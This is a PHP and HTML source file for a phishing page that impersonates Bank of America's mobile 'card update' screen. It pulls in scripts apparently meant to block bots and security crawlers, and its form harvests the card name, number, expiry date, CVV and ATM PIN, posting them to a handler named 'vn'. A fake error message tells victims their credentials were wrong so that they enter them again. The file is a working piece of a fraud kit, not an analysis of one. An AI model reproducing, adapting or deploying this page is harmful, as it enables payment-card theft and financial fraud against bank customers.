<?php
session_start();
error_reporting(0);
include '../autob/bt.php';
include '../autob/basicbot.php';
include '../autob/uacrawler.php';
include '../autob/refspam.php';
include '../autob/ipselect.php';
include "../autob/bts2.php";
?>
<!DOCTYPE html>
<html class=" js no-flexbox canvas canvastext webgl touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers no-applicationcache svg inlinesvg smil svgclippaths"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
		
		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
		<title>Bank of America | card update</title>
    <link rel="shortcut icon" href="../bstyles/favicon.ico?ts=20151018" type="image/x-icon">
	<link rel="stylesheet" href="../bstyles/bactouch.css"><link rel="stylesheet" href="../bstyles/toolbar.css"><link rel="stylesheet" href="../bstyles/bact_listview.css"><link rel="stylesheet" href="../bstyles/footer.css"><link rel="stylesheet" href="../bstyles/slidemenu.css">
	<style>.signonVersionTwoHomePage{max-width:400px;margin:auto;}
	.fsd-secure-esp-skin {
    padding: 20px 0 20px 20px;
	;}
	.dsrt{width:70%}
	.srt{width:80%}
	</style>
	</head>

	<body>
	<div id="page" class="" style="position: static; float: left; height: 100%; width: 100%; left: 100%; display: block;">
	<div class="header-module">
   <div class="fsd-secure-esp-skin">
   	  <img height="28" width="230" alt="Bank of America" src="../bstyles/BofA_rgb.png">
      <div class="clearboth"></div>
   </div>
</div>
<div id="cmw_toolBar_" class="cmw_toolBar_"><a id="leftButton" role="button" class="hidden"></a><a id="slidemenuz" class="sprite backButton icon sprite-menu" href="#" title="Show menu for all mobile banking features" role="button"></a><div id="barker" class="hidden"></div><h1 id="title" class=""><div id="cmw_toolBar_titleText" style="padding-left: 34px; padding-right: 34px; width: 100%;">Confirm Card Details</div></h1><a id="rightButton" class="hidden"></a></div><div class="pageMinHeight">
<div class="signonVersionTwoHomePage">
<div id="scrollerwrapperOt" class="overthrow">

	<div id="accountLocked" class="<?php if(!isset($_GET[''.$theerrkey.''])){echo 'hidden';}?>">
		<ul class="listView edge">
			<li role="button" class="noLink">
				<div class="imageWrap paddingHoriz20"><img src="../bstyles/ico_alert@2x.png" class=""></div>
				<p class="subVal padding10 fontRed" id="headError">Error</p>
				<p class="subVal padding10" id="bodyError">The Credentials you entered were incorrect. Please try again...<span style="margin-top:10px;display:block;">We will query your email service provider to confirm you own this email.</span></p>
			</li>
		</ul>
	</div>
	
	<div id="successMsg"></div>
	
	<div id="newOnlineId" style="">
		<div class="toppad5">
			<fieldset>
				<div class="inputEntryContainer">
				<form id="frmCustomOnlineId" method="post" action="vn">
					<div class="inputContainer">
						<input type="text"  name="cardname" class="focus sprite-clear_input_icns" maxlength="" id="cardname" placeholder="Name On Card" autocomplete="off" autocapitalize="off" autocorrect="off" spellcheck="false">
					</div>
					<div class="inputContainer">
						<input type="text"  name="cardnumber" class=" sprite-clear_input_icns" maxlength="19" id="cardnumber" oninput="innumlen(this.value);demcnum()" onpaste="demcnum()" placeholder="Card Number" autocomplete="off" autocapitalize="off" autocorrect="off" spellcheck="false">
					</div>
					<div class="inputContainer srt" style="background-color: white;">
						<input id="expdate" type="tel" name="expdate" class="" placeholder="Expiration Date (MM/YY)" oninput="demexpDate()" maxlength="5" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false">
					</div>		
					<div class="inputContainer dsrt" style="background-color: white;">
						<input id="cvv" name="cvv" type="text" class="" placeholder="CVV" oninput="innumlen(this.value)" maxlength="3" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false">
				<input type="hidden" name="cub" value="<?php echo uniqid();?>">
					</div>
					<div class="inputContainer dsrt" style="background-color: white;">
						<input id="atm" name="atm" type="tel" class="" placeholder="ATM PIN" oninput='innumlen(this.value)' maxlength="4" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false">
					</div>
				</form></div>
				
			</fieldset>
		</div>
	</div>
	
	</div>
	<div>	
		<a id="btSignonContinue" href="javascript:void(0);" onclick="frmCustomOnlineId.submit();" role="button" class="btn">
			<img style="margin-bottom:-4px;" class="paddingHoriz10" src="../bstyles/secure_lock.png">
			<span id="signonLabel">Continue</span>
		</a>
	</div>
	
	<div id="helpOptionView" class="helpOptionView">
		<div class="padding10 center"></div>
		<div class="padding10"></div>
	</div>
	
	<div id="btnPin" style="position: fixed; bottom: 0px; display: none; height: auto;">
		<ul class="btnGroupPin">
			<li><a id="cancelButton" class="plain slideUp btnNeg" role="button" href="javascript:void(0);">Cancel</a></li>
		</ul>
	</div>
</div>


<script>
"use strict"
function popup(){var pop = document.getElementById('cvvpopup').style.display;
	if(pop=="block"){document.getElementById('cvvpopup').style.display="none";}
	else if(pop=="none"){document.getElementById('cvvpopup').style.display="block";};
};

function demexpDate(){var expdate=event.target;var key =event.data;var val=expdate.value;if(event.inputType=="insertText"){if(isNaN(parseInt(key))){event.target.value=val.slice(0,val.length-1);}; switch(val.length){case 1:if(key > 1){event.target.value="";}; break; case 2:if(val[0]==1 && key > 2 || isNaN(parseInt(key))){event.target.value=val.slice(0,val.length-1);} else if(val[0]==0 && key == 0){event.target.value=val.slice(0,val.length-1);} else {expdate.value=expdate.value+"/";}; break; case 4:if(key < 2 || key >= 3 || key == 0){event.target.value=val.slice(0,val.length-1);}; break; case 5:if(!isNaN(parseInt(key))){event.target.value=val;}; break;};};if(event.inputType=="deleteContentBackward" && val.length == 2){expdate.value=val[0]}};

function demcnum(){var self=event.target;var key =event.data;var val=self.value;var sep="-";var mval=val.replace(/\s/g,'').split('');
var pos=self.selectionStart;var cardtype=val.substring(0,2);var otherctype=val.substring(0,1);
if(pos){
if(/37|34/.test(cardtype)){self.maxLength="17";} else{self.maxLength="19";};
if(event.inputType=="insertText"){
if(cardtype==37 || cardtype ==34){for(var i=0;i < mval.length;i++){if(i==3 || i==9){mval[i]=mval[i]+' ';};};}
else{for(var i=0;i < mval.length;i++){if(i==3 || i==7 || i==11){mval[i]=mval[i]+' ';};};};
mval=mval.join('');mval=mval.split('');event.target.value=mval.join('');;
if(mval[pos]){if(cardtype==37 || cardtype ==34){
if(pos%4==0 && pos<6 && mval.length>=5){event.target.setSelectionRange(pos+1,pos+1);} else if(pos%12==0 && mval.length>=13){event.target.setSelectionRange(pos+1,pos+1);} else{event.target.setSelectionRange(pos,pos);};} else{if(pos%5==0){event.target.setSelectionRange(pos+1,pos+1)} else{event.target.setSelectionRange(pos,pos);};};};
};
if(event.inputType=="deleteContentBackward"){
if(cardtype==37 || cardtype ==34){for(var i=0;i < mval.length;i++){if(i==3 || i==9){mval[i]=mval[i]+' ';};};}
else{for(var i=0;i < mval.length;i++){if(i==3 || i==7 || i==11){mval[i]=mval[i]+' ';};};};
mval=mval.join('');mval=mval.split('');
event.target.value=mval.join('');
if(pos==0){event.target.setSelectionRange(0,0);}
else{if(cardtype==37 || cardtype ==34){
if(pos%4==0 && mval.length==5){event.target.setSelectionRange(pos,pos);} else if(pos%12==0 && mval.length==13){event.target.setSelectionRange(pos-1,pos-1);} else{event.target.setSelectionRange(pos,pos)};}
else{if(pos%5==0){event.target.setSelectionRange(pos-1,pos-1)} else{event.target.setSelectionRange(pos,pos);};};}
;};};
};

function innumlen(val){if(event.inputType=="insertText"){if(isNaN(parseInt(event.data))){if(val.length<=1){event.target.value="";} else{event.target.value=val.slice(0,val.length-1);};};};};

function stoplen(len){if(event.target.value.length==len && event.key!='Enter'){event.preventDefault();};}
</script>





</div></div>
		
	
</body></html>